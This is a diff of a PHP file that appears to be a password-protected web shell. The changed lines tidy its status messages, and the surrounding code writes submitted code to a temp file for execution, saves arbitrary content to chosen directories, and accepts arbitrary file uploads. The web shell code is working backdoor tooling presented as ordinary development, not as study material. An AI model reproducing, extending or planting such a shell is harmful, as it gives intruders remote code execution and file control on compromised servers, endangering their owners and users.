@@ -107,10 +107,9 @@ if($_POST['run']){
     };
 
     if(file_put_contents("$tmp_file","$code")){
-      	$tmp_run_file = $tmp_file;
-        $tmp_run = "<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_run_file' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_run_file";
+        $tmp_run = "<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_file' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_file";
     }else{
-    	$tmp_run = "<mark style='background: #ffffff'><a style='color:#ff4757'> failed saving tmp";
+    	$tmp_run = "<mark style='background: #ffffff'><a style='color:#ff4757'> failed saving tmp -> $tmp_file";
     };
 };
 if($_GET['run']){
@@ -232,7 +231,7 @@ if ($mode == "command") {
         echo(htmlspecialchars($_POST['code']));
       };
 
-      echo "</textarea></div><br><input type='hidden' name='tmp' class='encode' value='$tmp_run_file'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>
+      echo "</textarea></div><br><input type='hidden' name='tmp' class='encode' value='$tmp_file'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>
 
     <table style='width:100%'>
     <tr style='text-align:center'>
@@ -270,28 +269,28 @@ if ($mode == "command") {
     echo "<center><hr style='border-top: 1px solid #dfe4ea' width='90%'><h4>";
     if(isset($_POST['savesubmit'])){
       if(!chdir($saveto)){
-        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist");
+        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $saveto");
       };
 
       $write = file_put_contents($file, $_POST['code']);
 		  if($write) {
-			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved $file");
+			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved -> $file");
 		  } else {
-			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save");
+			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save -> $file");
       }
 
     } elseif(isset($_POST['uploadsubmit'])){
       if(!chdir($uplto)){
-        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist");
+        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $uplto");
       };
 
       $uploadname = $_FILES['datupload']['name'];
       $uploadtmp = $_FILES['datupload']['tmp_name'];
       $write = copy($uploadtmp, $uploadname);
       if($write) {
-			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> uploaded $uploadname");
+			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> uploaded -> $uploadname");
 		  } else {
-			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload");
+			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload -> $uploadname");
 		  }
     } elseif($tmp_run){
         die("$tmp_run");
